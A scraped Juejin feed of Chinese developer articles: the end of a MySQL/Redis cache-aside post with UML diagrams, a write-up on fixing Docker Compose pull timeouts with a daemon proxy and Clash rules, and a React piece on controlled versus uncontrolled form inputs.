        log.info(<span class="hljs-string">"final mysql rank:\n"</span> + <span class="hljs-string">"\n"</span>.join(<span class="hljs-string">f"<span class="hljs-subst">{r[<span class="hljs-number">0</span>]:&gt;<span class="hljs-number">2</span>}</span> | <span class="hljs-subst">{r[<span class="hljs-number">1</span>]:&lt;<span class="hljs-number">5</span>}</span> | <span class="hljs-subst">{r[<span class="hljs-number">2</span>]}</span>"</span> <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> cur.fetchall()))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()
</code></pre>
<p>uml图可以查看</p>
<pre><code class="hljs language-rust" lang="rust">@startuml
title MySQL + Redis 协同时序（Cache-Aside + 延迟双删）

actor 客户端
participant Redis
database <span class="hljs-string">"MySQL"</span> <span class="hljs-keyword">as</span> MYSQL

== 读：缓存未命中 ==
客户端 <span class="hljs-punctuation">-&gt;</span> Redis: GET user:{uid}
Redis -<span class="hljs-punctuation">-&gt;</span> 客户端: nil
客户端 <span class="hljs-punctuation">-&gt;</span> Redis: SETNX lock:{uid} <span class="hljs-number">1</span>  ex=<span class="hljs-number">5</span>
alt 获取锁成功
    客户端 <span class="hljs-punctuation">-&gt;</span> MYSQL: SELECT ... 
    MYSQL -<span class="hljs-punctuation">-&gt;</span> 客户端: user 行
    客户端 <span class="hljs-punctuation">-&gt;</span> Redis: SETEX user:{uid} <span class="hljs-number">60</span>  <span class="hljs-title function_ invoke__">json</span>(user)
<span class="hljs-keyword">else</span> 获取锁失败
    客户端 <span class="hljs-punctuation">-&gt;</span> 客户端: <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.05</span>)
    客户端 <span class="hljs-punctuation">-&gt;</span> Redis: GET user:{uid}  \n重试
end
客户端 <span class="hljs-punctuation">-&gt;</span> Redis: DEL lock:{uid}

== 写：延迟双删 ==
客户端 <span class="hljs-punctuation">-&gt;</span> Redis: DEL user:{uid}          <span class="hljs-comment">// 第一次删</span>
客户端 <span class="hljs-punctuation">-&gt;</span> MYSQL: UPDATE score=...+delta
客户端 <span class="hljs-punctuation">-&gt;</span> 客户端: <span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">0.3</span>)             <span class="hljs-comment">// 延迟窗口</span>
客户端 <span class="hljs-punctuation">-&gt;</span> Redis: DEL user:{uid}          <span class="hljs-comment">// 第二次删</span>
@enduml
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc91c7c26b7f42adaea47b64be219e48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767943092&amp;x-signature=uLYQ%2BIpix4DS7juza2%2BXctbS14U%3D" alt="image.png" loading="lazy"/></p>
<p>类关系图</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-variable">@startuml</span>
class UserService {
  <span class="hljs-operator">-</span>r:Redis
  <span class="hljs-operator">+</span>get_user(uid:<span class="hljs-type">int</span>):dict
  <span class="hljs-operator">+</span>add_score(uid:<span class="hljs-type">int</span>,delta:<span class="hljs-type">int</span>)
}

UserService <span class="hljs-comment">--&gt; Redis : 使用</span>
UserService ..<span class="hljs-operator">&gt;</span> MySQL : 通过 get_cursor()

note <span class="hljs-keyword">right</span> <span class="hljs-keyword">of</span> UserService
  Cache<span class="hljs-operator">-</span>Aside
  延迟双删
  分布式互斥锁
<span class="hljs-keyword">end</span> note
<span class="hljs-variable">@enduml</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd4a0dba574e4ade9dc109843e220ad3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767943092&amp;x-signature=flsdLHw%2BB0bd7%2FyZHSoqFRkmHGA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Docker Compose Pull 超时与代理踩坑记录]]></title>    <link>https://juejin.cn/post/7590071125398175784</link>    <guid>https://juejin.cn/post/7590071125398175784</guid>    <pubDate>2026-01-02T06:54:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590071125398175784" data-draft-id="7590128405350400000" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Docker Compose Pull 超时与代理踩坑记录"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T06:54:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Johnnyhaha"/> <meta itemprop="url" content="https://juejin.cn/user/1398234521279502"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Docker Compose Pull 超时与代理踩坑记录
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1398234521279502/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Johnnyhaha
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:54:11.000Z" title="Fri Jan 02 2026 06:54:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Docker Compose Pull 超时与代理踩坑记录</h2>
<h3 data-id="heading-1">问题一：docker compose pull 直接超时</h3>
<h4 data-id="heading-2">报错</h4>
<pre><code class="hljs language-bash" lang="bash">&gt; docker compose pull
Error response from daemon: Get <span class="hljs-string">"https://registry-1.docker.io/v2/"</span>: dial tcp 108.160.170.33:443: i/o <span class="hljs-built_in">timeout</span> (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)
</code></pre>
<h4 data-id="heading-3">原因</h4>
<p>Docker daemon 无法直连 Docker Hub（国内网络被阻断）。</p>
<h4 data-id="heading-4">解决办法</h4>
<p>给 Docker 配代理，让 daemon 走代理访问外网。</p>
<pre><code class="hljs language-bash" lang="bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d
sudo vi /etc/systemd/system/docker.service.d/proxy.conf
</code></pre>
<p>内容</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[Service]</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"HTTP_PROXY=http://172.24.48.1:7890"</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"HTTPS_PROXY=http://172.24.48.1:7890"</span>
<span class="hljs-attr">Environment</span>=<span class="hljs-string">"NO_PROXY=localhost,172.24.48.1"</span>
</code></pre>
<p>然后</p>
<pre><code class="hljs language-bash" lang="bash">sudo systemctl daemon-reload
sudo systemctl restart docker
</code></pre>
<h3 data-id="heading-5">问题二：配置代理后仍然失败</h3>
<h4 data-id="heading-6">报错</h4>
<pre><code class="hljs language-bash" lang="bash">&gt; docker compose pull
Error response from daemon: Get <span class="hljs-string">"https://registry-1.docker.io/v2/"</span>: <span class="hljs-built_in">read</span> tcp 172.24.48.247:60752-&gt;172.24.48.1:7890: <span class="hljs-built_in">read</span>: connection reset by peer
</code></pre>
<h4 data-id="heading-7">定位方式</h4>
<pre><code class="hljs language-bash" lang="bash">curl -I https://registry-1.docker.io/v2/ --proxy http://172.24.48.1:7890
</code></pre>
<h4 data-id="heading-8">结果</h4>
<pre><code class="hljs language-vbnet" lang="vbnet">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> Connection established 
<span class="hljs-symbol">curl:</span> (<span class="hljs-number">35</span>) OpenSSL SSL_connect: Connection reset <span class="hljs-keyword">by</span> peer <span class="hljs-keyword">in</span> connection <span class="hljs-keyword">to</span> registry-<span class="hljs-number">1</span>.docker.io:<span class="hljs-number">443</span>
</code></pre>
<h4 data-id="heading-9">原因</h4>
<p>docker域名没有设置代理规则，走了直连</p>
<h4 data-id="heading-10">解决办法</h4>
<p>在代理（如 Clash）中强制 Docker Hub 走代理</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">rules:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,registry-1.docker.io,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN,auth.docker.io,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,docker.com,PROXY</span>
  <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN-SUFFIX,docker.io,PROXY</span>
</code></pre>
<p>重启 Clash，再试</p>
<h3 data-id="heading-11">最终验证</h3>
<pre><code class="hljs language-bash" lang="bash">curl -I https://registry-1.docker.io/v2/ --proxy http://172.24.48.1:7890
<span class="hljs-comment"># 成功</span>

docker compose pull
<span class="hljs-comment"># 成功</span>
</code></pre>
<h3 data-id="heading-12">优化</h3>
<ol>
<li>为避免每次拉取新的clash配置时重置自定义 rules，将上述 docker rules 设置到 mixins 中</li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-property">parse</span> = <span class="hljs-function">(<span class="hljs-params">{ content, name, url }, { yaml, axios, notify }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> rules = [
    <span class="hljs-comment">// ...</span>

    <span class="hljs-comment">// docker</span>
    <span class="hljs-string">"DOMAIN-SUFFIX,docker.com,PROXY"</span>,
    <span class="hljs-string">"DOMAIN-SUFFIX,docker.io,PROXY"</span>,
    <span class="hljs-string">"DOMAIN,registry-1.docker.io,PROXY"</span>,
    <span class="hljs-string">"DOMAIN,auth.docker.io,PROXY"</span>
  ]
  content.<span class="hljs-property">rules</span>.<span class="hljs-title function_">unshift</span>(...rules)
  <span class="hljs-keyword">return</span> content
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 表单的控制欲：什么时候我们真得控制它了，什么时候该放养了？]]></title>    <link>https://juejin.cn/post/7589962224795795494</link>    <guid>https://juejin.cn/post/7589962224795795494</guid>    <pubDate>2026-01-02T06:56:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589962224795795494" data-draft-id="7589958976226574346" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 表单的控制欲：什么时候我们真得控制它了，什么时候该放养了？"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-02T06:56:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="烟袅破辰"/> <meta itemprop="url" content="https://juejin.cn/user/1845419006243504"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 表单的控制欲：什么时候我们真得控制它了，什么时候该放养了？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1845419006243504/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    烟袅破辰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T06:56:10.000Z" title="Fri Jan 02 2026 06:56:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在写 React 代码时，你有没有过这样的困惑：</p>
<blockquote>
<p>我只是想让用户输入一段文字，然后提交。<br/>
为什么非要搞个 <code>useState</code> 来管理它？<br/>
用 <code>ref</code> 直接读取 DOM 值不行吗？</p>
</blockquote>
<p>如果你也这样想过，那你不是一个人。</p>
<p>今天我们就来聊一聊这个看似简单、实则深藏玄机的问题：<strong>React 中的受控组件和非受控组件，到底该选谁？</strong></p>
<hr/>
<h2 data-id="heading-0">一、问题的起点：我该如何获取表单值？</h2>
<p>最原始的需求是：<strong>用户输入内容 → 点击提交 → 获取输入内容</strong>。</p>
<p>这听起来很简单，但实现方式却有两条路：</p>
<ul>
<li><strong>方案A</strong>：给 <code>&lt;input&gt;</code> 加一个 <code>value</code> 属性，并通过 <code>onChange</code> 更新状态。</li>
<li><strong>方案B</strong>：不设置 <code>value</code>，只用 <code>ref</code> 在提交时读取 DOM 的 <code>.value</code>。</li>
</ul>
<p>我们先看一段代码：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-section">[value, setValue]</span> = useState('')<span class="hljs-comment">;</span>
const <span class="hljs-attr">inputRef</span> = useRef(null)<span class="hljs-comment">;</span>

const <span class="hljs-attr">doLogin</span> = (e) =&gt; {
  e.preventDefault()<span class="hljs-comment">;</span>
  console.log(inputRef.current.value)<span class="hljs-comment">; // 从 DOM 读值</span>
}<span class="hljs-comment">;</span>

return (
  &lt;form <span class="hljs-attr">onSubmit</span>={doLogin}&gt;
    &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> value={value} <span class="hljs-literal">on</span>Change={(e) =&gt; setValue(e.target.value)} /&gt;
    &lt;input <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> ref={inputRef} /&gt;
    &lt;button <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;登录&lt;/button&gt;
  &lt;/form&gt;
)<span class="hljs-comment">;</span>
</code></pre>
<p>这段代码里有两个输入框：</p>
<ul>
<li>第一个是受控的（<code>value={value}</code>）</li>
<li>第二个是非受控的（<code>ref={inputRef}</code>）</li>
</ul>
<p>当你点击“登录”，你会看到两个值都被打印出来 —— 但它们的来源完全不同。</p>
<hr/>
<h2 data-id="heading-1">二、思考：为什么需要“控制”？</h2>
<p>我们先问自己一个问题：</p>
<blockquote>
<p>如果我不用 <code>state</code> 控制输入框，而是直接读 DOM，是不是更省事？</p>
</blockquote>
<p>看起来是的。代码少，逻辑清晰，还能避免状态同步的问题。</p>
<p>但这里有一个关键的认知偏差：<strong>我们以为“读取值”只需要一次操作，但实际上，用户的交互是一个持续的过程。</strong></p>
<h3 data-id="heading-2">🌪️ 想象这样一个场景：</h3>
<p>你在做一个登录表单，要求密码至少 6 位，且包含数字。</p>
<p>如果使用非受控组件，你只能在提交时判断是否符合规则。<br/>
但如果用户输入了 <code>abc123</code>，系统提示“太短了”，然后他继续打 <code>456</code>，变成 <code>abc123456</code>，这时候你才发现合格。</p>
<p>问题是：<strong>你怎么知道他在中间改了多少次？怎么实时反馈？</strong></p>
<p>而受控组件可以做到这一点：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input
  <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span>
  <span class="hljs-attr">value</span>={form.password}
  <span class="hljs-attr">onChange</span>={(e) =&gt; {
    const <span class="hljs-attr">pwd</span> = e.target.value<span class="hljs-comment">;</span>
    setForm({ ...form, password: pwd })<span class="hljs-comment">;</span>
    if (pwd.length &gt;= 6 &amp;&amp; /\d/.test(pwd)) {
      setValid(true)<span class="hljs-comment">;</span>
    } else {
      setValid(false)<span class="hljs-comment">;</span>
    }
  }}
/&gt;
</code></pre>
<p>这就是“控制”的价值：<strong>把数据流从“被动响应”变成“主动驱动”。</strong></p>
<hr/>
<h2 data-id="heading-3">三、再深入一步：什么是“受控”？</h2>
<p>很多人误以为“受控”就是“加了个 <code>value</code>”，其实不然。</p>
<p>真正的“受控”是一种<strong>设计理念</strong>：</p>
<blockquote>
<p>所有的 UI 状态都由 React 的 state 驱动，而不是由 DOM 自行决定。</p>
</blockquote>
<p>这意味着：</p>
<ul>
<li>输入框的值来自 <code>state</code></li>
<li>用户输入触发事件，更新 <code>state</code></li>
<li>页面重新渲染，显示新的值</li>
</ul>
<p>这是一个闭环，形成了<strong>单向数据流</strong>。</p>
<p>这种模式的好处在于：</p>
<ul>
<li>数据可预测（不会出现“页面显示 A，实际是 B”的问题）</li>
<li>可以在任意时刻进行校验、重置、保存</li>
<li>更容易测试和调试</li>
</ul>
<p>而 <code>ref</code> 虽然能拿到值，但它绕过了 React 的状态系统，属于“黑箱操作”。</p>
<hr/>
<h2 data-id="heading-4">四、那什么时候该“放手”？</h2>
<p>既然受控这么好，为什么还要有非受控组件？</p>
<p>因为有些场景，我们并不需要“控制”。</p>
<p>比如评论框：</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">textareaRef</span> = useRef(null)<span class="hljs-comment">;</span>

const <span class="hljs-attr">handleSubmit</span> = () =&gt; {
  const <span class="hljs-attr">comment</span> = textareaRef.current.value<span class="hljs-comment">;</span>
  if (!comment) {
    alert('请输入评论')<span class="hljs-comment">;</span>
    return<span class="hljs-comment">;</span>
  }
  console.log(comment)<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
</code></pre>
<p>在这个例子中：</p>
<ul>
<li>用户输入完就提交</li>
<li>不需要实时校验</li>
<li>不需要联动其他字段</li>
<li>也不需要预览或自动补全</li>
</ul>
<p>这时候，用 <code>ref</code> 是一种<strong>轻量级的选择</strong>。</p>
<p>而且，在某些性能敏感的场景下，频繁触发 <code>setState</code> 会影响性能。例如文件上传、富文本编辑器等，这些组件内部有自己的状态管理机制，强行用 React 控制反而会增加复杂度。</p>
<hr/>
<h2 data-id="heading-5">五、结论：不是选择题，而是权衡题</h2>
<p>回到最初的问题：<strong>我应该用受控还是非受控？</strong></p>
<p>答案不是“哪个更好”，而是：</p>
<blockquote>
<p><strong>根据业务需求做权衡。</strong></p>
</blockquote>



































